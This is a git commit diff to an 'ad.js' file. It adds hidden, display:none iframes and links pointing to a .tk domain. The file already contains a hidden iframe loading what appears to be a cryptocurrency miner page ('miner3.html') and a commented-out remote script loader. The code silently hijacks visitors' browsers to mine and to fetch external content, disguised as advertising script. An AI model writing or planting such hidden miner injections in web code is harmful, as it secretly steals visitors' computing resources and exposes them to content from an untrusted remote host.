7225a227d9eb115f9c2dec04c1fc16c0be8ed504
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-11-07 16:05:59 +0800

    few

--- ad.js
+++ ad.js
@@ -5,8 +5,8 @@
     b.src = "http://www.7k77.tk/eicXsB?1504592003";
     (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b) */
     var divs=[
-
-    "<iframe id=\"emprise\" src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
+    "<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
+    "<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
     "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
     ]
     for (var i=0,len=divs.length;i<len;i++){
